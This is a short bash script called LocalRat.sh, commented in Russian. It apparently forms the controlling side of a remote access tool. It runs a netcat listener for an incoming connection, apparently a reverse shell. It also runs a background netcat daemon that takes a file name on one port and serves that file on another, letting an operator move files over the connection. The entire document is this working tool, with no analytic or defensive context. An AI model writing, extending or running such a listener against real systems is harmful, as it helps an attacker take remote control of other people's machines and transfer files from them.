#!/bin/bash -
# Shebang
# 
# LocalRat.sh
# start not from root. Not id "0"
# Usage:  LocalRat.sh  port1 [port2 [port3]]
# 


function bgfilexfer ()   # Определяю фоновый демон передачи файлов

{
    while true
    do
        FN=$(nc -nlvvp $HOMEPORT2 2>>/tmp/x2.err)   # Слушаю второй номер порта 2, errors >> stdout 
        if [[ $FN == 'exit' ]] ; then exit ; fi     
        nc -nlp $HOMEPORT3 < $FN                                     
    done
}

# -------------------- main ---------------------
HOMEPORT=$1
HOMEPORT2=${2:-$((HOMEPORT+1))}
HOMEPORT3=${3:-$((HOMEPORT2+1))}


bgfilexfer &                              # запускаю демон фоновой передачи файлов        


nc -nlvp $HOMEPORT                        # слушаю входящее соединение           

